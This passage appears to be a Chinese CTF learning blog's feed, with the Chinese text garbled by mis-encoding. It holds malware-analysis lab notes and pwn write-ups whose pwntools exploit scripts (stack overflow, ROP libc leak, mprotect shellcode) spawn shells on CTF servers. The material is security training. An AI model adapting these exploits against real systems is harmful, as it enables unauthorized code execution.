<em><strong>CONNECT %s:%i HTTP/1.0</strong></em> è”ç½‘ //è¿™ä¸ªæœ‰å¯èƒ½æ˜¯ç¨‹åºçš„printfç±»çš„å‡½æ•°çš„å‚æ•°ï¼Œ%så¯èƒ½æ˜¯åŸŸåï¼Œ%iä½œç”¨å’Œ%då·®ä¸å¤šï¼ˆå…¶å®å·®åˆ«å¾ˆå¤§ï¼Œä½†æ˜¯ä¸ºäº†æ–¹ä¾¿ç†è§£ï¼Œè¿™é‡Œå¯ä»¥æŠŠ%içœ‹å‡º%dï¼‰ï¼Œåº”è¯¥æ˜¯ç«¯å£å·<br>
<em><strong>admin</strong></em><br>
<em><strong>advpack</strong></em>   //ç”¨æ¥å¸®åŠ©ç¡¬ä»¶å’Œè½¯ä»¶è¯»å–å’ŒéªŒè¯.INFæ–‡ä»¶ï¼ŒINFæ˜¯ç¡¬ä»¶è®¾å¤‡åˆ¶é€ å•†å‘å¸ƒèµ·é©±åŠ¨ç¨‹åºçš„ä¸€ç§æ–‡ä»¶æ ¼å¼ï¼ˆè¯´æ˜è¿™ä¸ªç—…æ¯’å¾ˆæœ‰å¯èƒ½è¦å»æ„ŸæŸ“æŸä¸ªé©±åŠ¨)<br>
***VideoDriver ***  //æ˜¾å¡é©±åŠ¨ï¼ˆå¾ˆæœ‰å¯èƒ½ä¼šæ„ŸæŸ“æ˜¾å¡é©±åŠ¨)<br>
æ³¨å†Œè¡¨<br>
<em><strong>SOFTWARE\Classes\http\shell\open\commandV</strong></em> å¯åŠ¨å‘½ä»¤è¡Œ<br>
<em><strong>Software\Microsoft\Active Setup\Installed Components</strong></em> å®‰è£…ç»„ä»¶<br>
<em><strong>SOFTWARE\Microsoft\Windows\CurrentVersion\Run</strong></em> è‡ªå¯åŠ¨ï¼ï¼<br>
<em><strong>SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</strong></em> å…±äº«æ–‡ä»¶å¤¹<br>
ç½‘å€<br>
<em><strong>www.practicalmalwareanalysis.com</strong></em></p>
<p>0x03 å®‰è£…apateDNS å’Œ I æŸ¥çœ‹DNSæŸ¥è¯¢<br>
å‚è€ƒ https://blog.csdn.net/m0_46687377/article/details/120733392<br>
<img src="https://yearsnew.github.io/post-images/1664859401522.png" alt="" loading="lazy"><br>
ä¸”éƒ½ä½¿ç”¨VMnet2<br>
<img src="https://yearsnew.github.io/post-images/1664859466681.png" alt="" loading="lazy"><br>
kaliè‡ªå¸¦Inetsimå·¥å…·ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸éœ€è¦å†ä¸‹è½½ï¼Œåªéœ€è¦è¿›å…¥åˆ°/etc/inetsimæ–‡ä»¶å¤¹ä¿®æ”¹inetsim.confæ–‡ä»¶å³å¯<br>
ä¿®æ”¹inetsim.confæ–‡ä»¶çš„ä»¥ä¸‹å†…å®¹å³å¯å¯åŠ¨DNSæœåŠ¡<br>
service_bind_addressï¼š 192.168.40.130ï¼ˆKaliè™šæ‹ŸæœºIPï¼‰<br>
dns_default_ipï¼š 192.168.40.130<br>
redirect_enabled yes<br>
redirect_exclude_port tcp:22<br>
redirect_external_address 192.168.40.130</p>
<p>å‘½ä»¤inetsimå¯åŠ¨æœåŠ¡</p>
<p>0x04 process monitor æŸ¥çœ‹è¿è¡Œçš„è¿›ç¨‹</p>
<h3 id="lab03-02"><strong>Lab03-02</strong></h3>
<h3 id="lab03-03"><strong>Lab03-03</strong></h3>
<h3 id="lab03-04"><strong>Lab03-04</strong></h3>
<h2 id="chapter_5l-ida-pro"><strong>Chapter_5L</strong> IDA Pro</h2>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[5space2022]]></title>
        <id>https://yearsnew.github.io/post/5space/</id>
        <link href="https://yearsnew.github.io/post/5space/">
        </link>
        <updated>2022-09-21T06:25:09.000Z</updated>
        <content type="html"><![CDATA[<p><s>æ‰“ç ´æ»¡è¯¾ä¸€å¤©çŸ­æš‚åˆä¼‘çš„åç‰¢</s></p>
<h2 id="pwn">pwn</h2>
<h3 id="5_1h3ll0rop">5_1H3ll0Rop</h3>
<p>æ•´ä¸ªé¢˜ç›®ä¸<br>
expå¦‚ä¸‹ï¼š</p>
<pre><code>from pwn import *
from LibcSearcher import *

p = remote(&quot;39.107.243.76&quot;,51575)
# p=process('./H3ll0Rop',env={'LD_PRELOAD':'./libc-2.23.so'})
# p = process(&quot;./H3ll0Rop&quot;)
elf = ELF(&quot;./H3ll0Rop&quot;)
libc = ELF(&quot;./libc-2.23.so&quot;)
context.log_level = &quot;debug&quot;

#åˆ©ç”¨printfæ³„éœ²libc
format_str = 0x400778
pop_rdi = 0x400753
pop_rsi_r15 = 0x0400751
printf_plt = elf.plt['printf']
main = elf.sym['main']
printf_got = elf.got['printf']
read_got = elf.got['read']
payload = b'a' * (0x60 + 8) + p64(pop_rdi) + p64(format_str) + p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(printf_plt) + p64(main) 
p.recvuntil(&quot;with me???\n&quot;)
p.sendline(payload)
p.recvuntil('aaaa')
read_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
print(&quot;read_addr:&quot;,hex(read_addr))

#libc åŸºåœ°å€
libc_base = read_addr - libc.sym['read']
system_addr = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))
payload = b'a' * (0x60 + 8) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)  

p.sendline(payload)

p.interactive()
</code></pre>
<h2 id="reverse">Reverse</h2>
<h3 id="5_re2">5_re2</h3>
<p>åšé¢˜ç›®æ—¶ï¼Œç”¨idaæ‰“å¡å‘ç°ä¸èƒ½F5åæ±‡ç¼–ï¼Œç»å­¦ä¹ ï¼Œå¯ä»¥ä½¿ç”¨Ghidraæ‰“å¼€ã€‚<br>
åˆ†æmoveå‡½æ•°å’Œfindå‡½æ•°ï¼Œæ‰¾åˆ°mapåœ°å€ã€0x120012030bã€‘ï¼Œç„¶åååœ¨idaä¸­ <code>Shift + E</code> æå–æ•°æ®ã€‚<br>
æ•°æ®ä¸º15 * 15 çš„ä¸‰å±‚åœ°å›¾ï¼Œæ¯å±‚ä» 3 èµ°åˆ° 4 ã€‚</p>
<h3 id="5_crackme">5_crackme</h3>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[NewStarCTF2022]]></title>
        <id>https://yearsnew.github.io/post/2022-newstarctf/</id>
        <link href="https://yearsnew.github.io/post/2022-newstarctf/">
        </link>
        <updated>2022-09-20T04:14:45.000Z</updated>
        <content type="html"><![CDATA[<h2 id="pwn">PWN</h2>
<h3 id="ret2text">ret2text</h3>
<p>æŸ¥çœ‹ä¿æŠ¤å’Œè¯•è¿è¡Œ<br>
<img src="https://yearsnew.github.io/post-images/1663647944830.png" alt="" loading="lazy"><br>
shift + F12  æŸ¥çœ‹å­—ç¬¦ä¸²ï¼Œå«æœ‰ /bin/shï¼Œè·Ÿè¿› Ctrl + x æŸ¥çœ‹è°ƒç”¨ä½ç½®ï¼Œæ‰¾åˆ°åé—¨å‡½æ•° backdooOo0r<br>
<img src="https://yearsnew.github.io/post-images/1663648286053.png" alt="" loading="lazy"><br>
ç®€å•çš„ret2textï¼Œexpå¦‚ä¸‹ï¼š</p>
<pre><code>from pwn import *
context(os='linux', arch='amd64', log_level='debug')

p = remote('node4.buuoj.cn',26207)

backdooOo0r = 0x400708

payload = b'a'*(0x20 + 8) + p64(backdooOo0r)
p.recvuntil(&quot;your name?\n&quot;)
p.sendline(payload)

p.interactive()
</code></pre>
<h3 id="calc">calc</h3>
<p>æŸ¥çœ‹ä¿æŠ¤ã€ä¿æŠ¤å…¨å¼€ï¼ã€‘å’Œ è¯•è¿è¡Œï¼ˆæ„Ÿè§‰æ˜¯éšæœºæ•°æˆ–è€…æ•´æ•°æº¢å‡ºï¼‰<br>
<img src="https://yearsnew.github.io/post-images/1663649389572.png" alt="" loading="lazy"><br>
ç»è¿‡åˆ†æï¼Œæ˜¯ä¸€é“100é“éšæœºåŠ å‡ä¹˜é™¤é¢˜ç›®ï¼Œç­”å¯¹äº†å°±getshell ï¼ˆ=ç»ç¡®è®¤ï¼Œæ˜¯æˆ‘ä¹‹å‰ä¸€ç›´ä¸ä¼šå†™ï¼Œç°åœ¨ä¹Ÿä¸ä¼šå†™çš„é¢˜ç›®ğŸ˜­ï¼‰</p>
<p>ç¬‘æ­»äº†ï¼Œçœ‹åˆ°åˆ«çš„å¸ˆå‚…çš„è§£ï¼Œæˆ‘æ€€ç–‘æ˜¯éé¢„æœŸğŸ˜¶â€ğŸŒ«ï¸ğŸ˜¶â€ğŸŒ«ï¸ğŸ˜¶â€ğŸŒ«ï¸</p>
<pre><code>from pwn import *
#from LibcSearcher import *
local_file = './cala'
local_libc = './libc-2.27.so'
remote_libc = './libc-2.27.so'
#remote_libc = '/home/glibc-all-in-one/libs/buu/libc-2.23.so'
select = 1
if select == 0:
    r = process(local_file)
    libc = ELF(local_libc)
else:
    r = remote('node4.buuoj.cn', 25712)
    libc = ELF(remote_libc)
elf = ELF(local_file)
context.log_level = 'debug'
context.arch = elf.arch
def se(data): return r.send(data)


def sa(delim, data): return r.sendafter(delim, data)
def sl(data): return r.sendline(data)


def sla(delim, data): return r.sendlineafter(delim, data)
def sea(delim, data): return r.sendafter(delim, data)
def rc(numb=4096): return r.recv(numb)
def rl(): return r.recvline()
def ru(delims): return r.recvuntil(delims)
def uu32(data): return u32(data.ljust(4, '\0'))
def uu64(data): return u64(data.ljust(8, '\0'))
def info(tag, addr): return r.info(tag + ': {:#x}'.format(addr))


def debug(cmd=''):
    gdb.attach(r, cmd)


# -----------------------------
for i in range(100):
    ru('What\'s the answer? ')
    sl(str(eval(r.recvuntil('=', drop=True).replace('x', '*'))))
r.interactive()

</code></pre>
<h3 id="ret2libc">ret2libc</h3>
<h3 id="ret2shellcode">ret2shellcode</h3>
<h3 id="fallw1nds-gift">fallw1nd's gift</h3>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[åˆ·é¢˜æ‚è®°]]></title>
        <id>https://yearsnew.github.io/post/shua-ti-za-ji/</id>
        <link href="https://yearsnew.github.io/post/shua-ti-za-ji/">
        </link>
        <updated>2022-09-20T03:59:57.000Z</updated>
        <content type="html"><![CDATA[<h2 id="0x00-è°ƒæ•´"><strong>[0x00]. è°ƒæ•´</strong></h2>
<p>æ„Ÿè§‰è¦å­¦ç€å†™è§„èŒƒçš„WPäº†ï¼Œä¸Šä¸€ç¯‡å†™äº†å½’çº³æ€»ç»“ï¼Œä½†è¿™æœŸé—´å†™çš„é¢˜ç›®éƒ½åªç•™äº†expå’Œä¸€ç‚¹ç”»å¾—ä¹±èµ·å…«ç³Ÿçš„å †æ ˆç»“æ„åˆ†æå›¾ï¼Œä»¥åŠexpé‡Œå¾®è–„çš„æ³¨é‡Šã€‚ç»“åˆå¤§ä½¬çš„åšå®¢ï¼Œæ˜¾ç„¶æœ‰é€‚å½“çš„åˆ†æå›¾ç‰‡æ›´å®¹æ˜“åœ¨ç¿»çœ‹æ—¶å”¤èµ·è®°å¿†ï¼Œæ•…æ­¤â€”â€”</p>
<p><s>å…¥é—¨å³æ˜¯å †ğŸ˜</s></p>
<h2 id="0x01-babyheap_0ctf_2017"><strong>[0x01]. babyheap_0ctf_2017</strong></h2>
<p>ã€é‡ç‚¹æ˜¯åˆ©ç”¨æ€è·¯å’Œè°ƒè¯•è¿‡ç¨‹ã€‘</p>
<blockquote>
<p>ä¸€é“ ç”±å·² Allocate åˆ†é…ç¡®å®šäº†chunkå¤§å° ï¼Œè€Œ Fill å¯å†è¾“å…¥å¤§å°ï¼ˆæ— ç©·å¤§ï¼Œæ’‘çˆ†ï¼ï¼‰å¯¼è‡´çš„å †æº¢å‡ºæ¼æ´ ==&gt;  Unsorted bin leak + Fastbin Attack + one_gadget</p>
</blockquote>
<ol>
<li>è¿™ä½å¸ˆå‚…å†™å¾—éå¸¸å¥½ï¼Œåˆ†æå¾ˆç»†èŠ‚ï¼Œè€Œä¸”è·Ÿæˆ‘è¿›åº¦å‡ ä¹åŒæ­¥ <s>ï¼‰ä¸€ç‚¹å°æ¿€åŠ¨</s><br>
<s>éƒ½è¯´å †æ˜¯ç“¶é¢ˆï¼Œå½“å†çœ‹è¿™é¢˜çš„æ—¶å€™ï¼Œå¸ˆå‚…è¿˜æ²¡æœ‰å†æ›´æ–°ğŸ˜”æˆ‘ä¹ŸğŸ•Šäº†ä¸€æ®µæ—¶é—´</s></li>
<li>é¢˜ç›®åˆ†æè¿‡ç¨‹å°±ä¸å†é‡å¤äº†ï¼š<br>
https://blog.csdn.net/qq_41696518/article/details/126677556?spm=1001.2014.3001.5502</li>
<li>åˆ©ç”¨æ€è·¯ï¼š<br>
æ‹œå¸ˆå‚…å¯¹å †åˆ©ç”¨çš„æ€»ç»“<br>
https://arttnba3.cn/2021/05/10/PWN-0X01-GLIBC_HEAP-EXPLOIT/#0x04-%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F</li>
</ol>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[æ¸©æ•…è€ŒçŸ¥æ–°]]></title>
        <id>https://yearsnew.github.io/post/wen-gu-er-zhi-xin/</id>
        <link href="https://yearsnew.github.io/post/wen-gu-er-zhi-xin/">
        </link>
        <updated>2022-09-07T13:17:09.000Z</updated>
        <content type="html"><![CDATA[<p>æ„Ÿè§‰åšBUUCTFä¹‹ç±»ä¸Šé¢çš„é¢˜ï¼Œå°±æœ‰ç‚¹åƒï¼Œä¿®ä»™æ–‡ä¸­ï¼Œä¿®ç‚¼äº†ä¸€æ®µæ—¶é—´ï¼Œå»å†ç»ƒæ‰“å°é‡æ€ªï¼›è€Œå‚åŠ ä¸€äº›è¾ƒæ–°çš„å¤§æ¯”èµ›ï¼Œå°±åƒæ˜¯æ‰“å®æˆ˜ï¼ˆä½†æˆ‘å¾ˆèœï¼‰ã€‚<br>
æœ¬æƒ³ç€çœ‹CTFwikiä¸Šçš„æ ˆç›¸å…³çš„å¤ä¹ ä¸€ä¸‹ï¼Œå‘ç°åˆå¢åŠ äº†è®¸è®¸å¤šå¤šæ–°çš„ä½“ä¼šï¼Œä»¥å‰äº†è§£çš„å¹¶ä¸å¤Ÿé€å½»ã€‚ret2XXç³»åˆ—çœŸçš„è®²å¾—éå¸¸æ¸…æ¥šï¼ï¼ï¼<br>
è®°ï¼šå‘¨å››ä¸‹åˆï¼Œç„¦è™‘çš„ä¸€ä¸‹åˆ......<br>
æ¸æ¸å‘ç°ï¼Œä¸Šä¸€ç¯‡çš„å¾ˆå¤šé”™è¯¯ï¼Œå’Œç†è§£ä¸åˆ°ä½çš„åœ°æ–¹ã€‚æš‚æ—¶æŒ–ä¸ªå‘ğŸ•³ï¼Œä¹‹åæœ‰æ—¶é—´å†ä¿®æ­£ï¼ŒåŒæ—¶è®°å¾—é‡æ’ã€onenoteç”¨å¾—è¿˜æ˜¯éå¸¸å¤šçš„ï¼Œä½†æ˜¯æ‚ä¹±è€Œç»†ç¢å¯¼è‡´æˆ‘è·³äº†è¿™ä¹ˆå¤šè½¯ä»¶ï¼Œå°è±¡ç¬”è®°é‡Œè¿˜æœ‰æ–‡ï¼Œæ²¡æœ‰è¿è¿‡æ¥åº”è¯¥ï¼Œè¯­é›€éå¸¸å¥½ï¼ä½†æ˜¯æ²¡ç”¨å¤šå°‘ï¼Œå› ä¸ºè¿‡åˆ†è¿½æ±‚æ•´é½è€ŒåŠé€€ä½¿ç”¨ï¼Œç°åœ¨åˆè·³ã€‘æ„Ÿè§‰é€‚æ—¶æ•´ç†ï¼Œæ¯”ä¸€å¼€å§‹å°±å¼ºè¿«è‡ªå·±å¥½</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[My First Blog]]></title>
        <id>https://yearsnew.github.io/post/my-first-blog/</id>
        <link href="https://yearsnew.github.io/post/my-first-blog/">
        </link>
        <updated>2022-09-05T01:58:30.000Z</updated>
        <content type="html"><![CDATA[<p>æœ¬æ¥å‡†å¤‡æ˜¨å¤©ï¼ˆå‘¨å¤©ï¼‰å†™ä¸€ç¯‡ä¸€å‘¨æ€»ç»“çš„æ–‡å­—ï¼Œåˆçªç„¶æƒ³åˆ°è‡ªå·±æ­å»ºåšå®¢ï¼Œæææƒšæƒšï¼Œä¸€å¤©å°±è¿‡å»äº†ğŸ˜¥ã€‚<br>
ä¸»è¦è¾ƒä»¥å‰æ›´ç†æ¸…äº†æ ˆæº¢å‡ºçš„ç›¸å…³å†…å®¹<br>
ä»¥åŠexpçš„ä¹¦å†™</p>
<h2 id="é¢˜ç›®å†…å·²ç»å«æœ‰åé—¨å‡½æ•°æ— canary">é¢˜ç›®å†…å·²ç»å«æœ‰åé—¨å‡½æ•°ï¼ˆæ— canaryï¼‰</h2>
<pre><code>1.ç›´æ¥è¦†ç›–æ ˆï¼Œæº¢å‡ºåˆ°åé—¨å‡½æ•°çš„åœ°å€
2.shift + f12 åˆ—å‡ºå­—ç¬¦ä¸²
3.åŒå‡»è·Ÿè¿› åœ¨æ®µä¸­ä½ç½®ï¼ŒCtrl + x åˆ—å‡ºè°ƒç”¨ä½ç½®
ï¼ˆå¦ï¼šCtrl + s åˆ—å‡ºæ‰€æœ‰soæ–‡ä»¶æ˜ å°„åˆ°å†…å­˜çš„åŸºåœ°å€ï¼‰
</code></pre>
<blockquote>
<p>ç›¸ä¼¼pwnï¼š<br>
ç›´æ¥åé—¨å‡½æ•°  <a href="https://github.com/yearsnew/CTF_Source-WP/tree/main/bjdctf_2020_babystack"><font color=YellowGreen>bjdctf_2020_babystack</font></a><br>
è¦†ç›–æ•°å­—ï¼Œè¾¾åˆ°æ¡ä»¶   <a href="https://github.com/yearsnew/CTF_Source-WP/tree/main/ciscn_2019_n_8"><font color=YellowGreen>ciscn_2019_n_8</font></a></p>
</blockquote>
<hr>
<h2 id="é¢˜ç›®æä¾›äº†libc">é¢˜ç›®æä¾›äº†libc</h2>
<h3 id="åŠ¨æ€é“¾æ¥çš„ret2libc">åŠ¨æ€é“¾æ¥çš„ret2libc</h3>
<pre><code>ä½¿ç”¨$ file ã€æ–‡ä»¶åã€‘æŸ¥çœ‹æ–‡ä»¶çš„è¯¦ç»†ä¿¡æ¯
# dynamically linked
</code></pre>
<p><font color=CornflowerBlue>ç”¨å‘½ä»¤æŸ¥æ‰¾ï¼Œä½“ä¼šropé“¾çš„æ„é€ </font></p>
<ol>
<li><strong>å‡†å¤‡å·¥ä½œ</strong></li>
</ol>
<ul class="contains-task-list">
<li class="task-list-item"><input class="task-list-item-checkbox" disabled="" type="checkbox" id="task-item-8467117"><label class="task-list-item-label" for="task-item-8467117"> è¦è·å¾—libcçš„åŸºåœ°å€</label></li>
</ul>
<ul>
<li>libcçš„åŸºåœ°å€ = åº“å‡½æ•°åœ¨ç¨‹åºä¸­åŠ è½½è¿›å†…å­˜åçš„çœŸå®åœ°å€ - åº“å‡½æ•°åœ¨libcåº“ä¸­çš„åç§»
<ul>
<li>è¿›ä¸€æ­¥ï¼Œâ€œåº“å‡½æ•°åœ¨ç¨‹åºä¸­åŠ è½½è¿›å†…å­˜åçš„çœŸå®åœ°å€â€<br>
åŠ¨æ€é“¾æ¥æ—¶ï¼Œåº“å‡½æ•°çš„è°ƒç”¨è¿‡ç¨‹ï¼ˆä»¥putså‡½æ•°ä¸ºğŸŒ°ï¼‰ï¼š</li>
<li>è€Œâ€œåº“å‡½æ•°åœ¨libcåº“ä¸­çš„åç§»â€åˆ™æ›´å®¹æ˜“ (ä»¥ciscn_2019_c_1ä¸ºğŸŒ°)ï¼š<br>
<code> call puts  ==&gt; puts plt ==&gt; puts got ==&gt; puts </code></li>
</ul>
</li>
</ul>
<pre><code>    puts åœ¨ plt çš„åœ°å€     $ objdump -dj.plt ciscn_2019_c_1
    puts åœ¨ got çš„åœ°å€    $ objdump -R ciscn_2019_c_1
    ===================================================================
    puts åœ¨ libc ä¸­çš„åç§» $ objdump -R libc-2.23.so | grep puts
</code></pre>
<ul class="contains-task-list">
<li class="task-list-item"><input class="task-list-item-checkbox" disabled="" type="checkbox" id="task-item-8777172"><label class="task-list-item-label" for="task-item-8777172"> åˆ©ç”¨execveåœ¨libcä¸­çš„åç§»ï¼Œä¸ºè¾¾æˆè°ƒç”¨</label></li>
</ul>
<pre><code>    $ one_gadget libc-2.23.so
</code></pre>
<ol start="2">
<li><strong>æ„é€ payload</strong></li>
</ol>
<ul>
<li>payload1 = æ ˆå¤§å° + 8 + pop_rdi + puts_got + puts_plt +main<br>
<code> 32å¯¹åº”4ä¸ªå­—èŠ‚, 64å¯¹åº”8ä¸ªå­—èŠ‚</code><br>
<code> 64ä½è¦ç”¨pop_rdi è¿›è¡Œæ ˆå¯¹é½</code></li>
</ul>
<pre><code>    $ ROPgadget --binary ciscn_2019_c_1 | grep -E 'pop rdi'
</code></pre>
<ul>
<li>payload2 = æ ˆå¤§å° + 8 + execve_addr</li>
</ul>
<pre><code>    #execve_addr=libc_base + execve_offset
    #libc_base = puts_addr - puts_offet
</code></pre>
<h4 id="font-coloryellowgreenciscn_2019_c_1font"><font color=YellowGreen>ciscn_2019_c_1</font> ğŸ¾</h4>
<p><a href="https://github.com/yearsnew/CTF_Source-WP/tree/main/ciscn_2019_c_1">é¢˜ç›®åœ°å€ ä»¥åŠ libc-2.23.soåœ°å€</a></p>
<p>ğŸ¤<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mstyle mathcolor="CadetBlue"><mi>e</mi><mi>x</mi><mi>p</mi><mo>:</mo></mstyle></mrow><annotation encoding="application/x-tex">\color{CadetBlue}exp:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="color:CadetBlue;">e</span><span class="mord mathdefault" style="color:CadetBlue;">x</span><span class="mord mathdefault" style="color:CadetBlue;">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel" style="color:CadetBlue;">:</span></span></span></span></p>
<pre><code>#! /usr/bin/python

from pwn import *
from LibcSearcher import *

p = remote(&quot;node4.buuoj.cn&quot;,26815)
context.log_level = &quot;debug&quot;

#Information about puts
main_addr = 0x400b28
puts_plt = 0x4006e0
puts_got = 0x602020
pop_rdi = 0x400c83
ret_addr = 0x4006b9

#1.get libc_base
payload = b'\0' + b'a' * (0x50 + 0x8 - 0x1) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.recvuntil(&quot;Input your choice!\n&quot;)
p.sendline('1')
p.recvuntil(&quot;Input your Plaintext to be encrypted\n&quot;)
p.sendline(payload)
p.recvuntil(&quot;Ciphertext\n&quot;)
p.recvuntil(&quot;\n&quot;)
puts_addr = u64(p.recv(6).ljust(0x8,b&quot;\x00&quot;))
libc = LibcSearcher(&quot;puts&quot;,puts_addr)
libc_base = puts_addr - libc.dump(&quot;puts&quot;)
sys_addr=libc_base + libc.dump('system')
bin_sh=libc_base + libc.dump('str_bin_sh')
print(libc_base)
print(&quot;libc base: &quot;, hex(libc_base))
print(&quot;system address: &quot;, hex(sys_addr))

#2.get shell
payload = b'\0' + b'a' * (0x50 + 0x8 - 0x1) + p64(ret_addr) + p64(pop_rdi)  + p64(bin_sh) + p64(sys_addr)
p.recvuntil(&quot;Input your choice!\n&quot;)
p.sendline('1')
p.recvuntil(&quot;Input your Plaintext to be encrypted\n&quot;)
p.sendline(payload)

p.interactive()
</code></pre>
<hr>
<h2 id="é¢˜ç›®æœªæä¾›libc">é¢˜ç›®æœªæä¾›libc</h2>
<h3 id="libcsearcher-çš„ä½¿ç”¨">LibcSearcher çš„ä½¿ç”¨</h3>
<h4 id="font-coloryellowgreenogeek2019babyropfont"><font color=YellowGreen>[OGeek2019]babyrop</font>ğŸ¾</h4>
<p><a href="https://github.com/yearsnew/CTF_Source-WP/tree/main/%5BOGeek2019%5Dbabyrop">é¢˜ç›®é“¾æ¥</a></p>
<p>ğŸ¤<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mstyle mathcolor="CadetBlue"><mi>e</mi><mi>x</mi><mi>p</mi><mo>:</mo></mstyle></mrow><annotation encoding="application/x-tex">\color{CadetBlue}exp:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="color:CadetBlue;">e</span><span class="mord mathdefault" style="color:CadetBlue;">x</span><span class="mord mathdefault" style="color:CadetBlue;">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel" style="color:CadetBlue;">:</span></span></span></span></p>
<pre><code>from pwn import *
from LibcSearcher import *

p = remote(&quot;node4.buuoj.cn&quot;,25172)
context.log_level = &quot;debug&quot;
elf = ELF(&quot;./pwn&quot;)
libc = ELF(&quot;./libc-2.23.so&quot;)

#libc_base 
main_addr = 0x8048825
write_plt = elf.plt[&quot;write&quot;]
write_got = elf.got[&quot;write&quot;]

#1.strcmp v1 = 0
payload = b'\x00' + b'\xff' * 7
p.sendline(payload)
p.recvuntil('Correct\n')

#2.Get write address
payload = b'a' * (0xe7+0x4) + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4) #main_addrä½œä¸ºè¿”å›åœ°å€ï¼Œæ„é€ writeï¼ˆ1,read_got,4ï¼‰
p.sendline(payload)
write_addr = u32(p.recv(4))
print(&quot;*****write: &quot;,hex(write_addr))

libc_base = write_addr - libc.symbols[&quot;write&quot;]
sys_addr = libc_base + libc.symbols[&quot;system&quot;]
bin_sh = libc_base + next(libc.search(b'/bin/sh'))
print(&quot;*****libc_base: &quot;,hex(libc_base))
print(&quot;*****sys_addr: &quot;,hex(sys_addr))
print(&quot;*****bin_sh: &quot;,hex(bin_sh))

#3.get shell
payload = b'\x00' + b'\xff' * 7
p.sendline(payload)
p.recvuntil('Correct\n')

payload = b'a' * (0xe7+0x4)  + p32(sys_addr) + p32(1) + p32(bin_sh)
p.sendline(payload)

p.interactive()
</code></pre>
<hr>
<p>ä¸¤ç§äº’é€šï¼Œå°±ç®—æ— å¯è‡ªå·±è¡¥libc</p>
<blockquote>
<p>ç›¸ä¼¼pwnï¼š<br>
ret2sys  <a href="https://github.com/yearsnew/CTF_Source-WP/tree/main/level2"><font color=YellowGreen>level2</font></a><br>
ret2sys+æ ˆå¯¹é½  <a href="https://github.com/yearsnew/CTF_Source-WP/tree/main/level2_x64"><font color=YellowGreen>level2_x64</font></a><br>
<code>$find -name flag</code> getshellä¹‹åæŸ¥æ‰¾flagæ–‡ä»¶  <a href="https://github.com/yearsnew/CTF_Source-WP/tree/main/babyrop"><font color=YellowGreen>babyrop</font></a></p>
</blockquote>
<hr>
<h3 id="é™æ€é“¾æ¥">é™æ€é“¾æ¥</h3>
<h4 id="font-coloryellowgreennot_the_same_3dsctf_2016font"><font color=YellowGreen>not_the_same_3dsctf_2016</font> ğŸ¾</h4>
<p><font color=CornflowerBlue>_dl_make_stack_executableæ–¹æ³•</font><br>
<a href="https://github.com/yearsnew/CTF_Source-WP/tree/main/not_the_same_3dsctf_2016">é¢˜ç›®é“¾æ¥</a><br>
ğŸ¤<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mstyle mathcolor="CadetBlue"><mi>e</mi><mi>x</mi><mi>p</mi><mo>:</mo></mstyle></mrow><annotation encoding="application/x-tex">\color{CadetBlue}exp:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="color:CadetBlue;">e</span><span class="mord mathdefault" style="color:CadetBlue;">x</span><span class="mord mathdefault" style="color:CadetBlue;">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel" style="color:CadetBlue;">:</span></span></span></span></p>
<pre><code>from pwn import *

elf = ELF('./not_the_same_3dsctf_2016')
p = remote('node4.buuoj.cn', 26172)
#p = process('./not_the_same_3dsctf_2016')

#1.è·å– mprotect() å‡½æ•°ç›¸å…³ä¿¡æ¯
#int mprotect(void *addr, size_t len, int prot);
#addr å†…å­˜å¯å§‹åœ°å€; len  ä¿®æ”¹å†…å­˜çš„é•¿åº¦ ; prot å†…å­˜çš„æƒé™;
pop3_ret = 0x0804f420 #å–ä¸‰ä¸ªå¯„å­˜å™¨ 0x0804f420 : pop ebx ; pop esi ; pop ebp ; ret
#å‹å…¥ä¸‰ä¸ªå‚æ•°
mem_addr = 0x080EB000
mem_len = 0x1000
mem_prot = 0x7

mprotect_addr = elf.symbols['mprotect']
read_addr = elf.symbols['read']

payload = b'a' * 45
payload += p32(mprotect_addr)
payload += p32(pop3_ret) 


payload += p32(mem_addr) 
payload += p32(mem_len)  
payload += p32(mem_prot)   

#2.è¿”å›åœ°å€å¡«ä¸Šreadå‡½æ•°ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥è¦å°†shellcodeè¯»å…¥ç¨‹åºæ®µ
payload += p32(read_addr)
#ssize_t read(int fd, void *buf, size_t count);
#fd è®¾ä¸º0æ—¶å°±å¯ä»¥ä»è¾“å…¥ç«¯è¯»å–å†…å®¹    è®¾ä¸º0
#buf è®¾ä¸ºæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å†…å­˜åœ°å€      è®¾ä¸ºæˆ‘ä»¬å·²æ‰¾åˆ°çš„å†…å­˜åœ°å€0x80EB000
#size é€‚å½“å¤§å°å°±å¯ä»¥               åªè¦å¤Ÿè¯»å…¥shellcodeå°±å¯ä»¥ï¼Œè®¾ç½®å¤§ç‚¹æ— æ‰€è°“
payload += p32(pop3_ret)
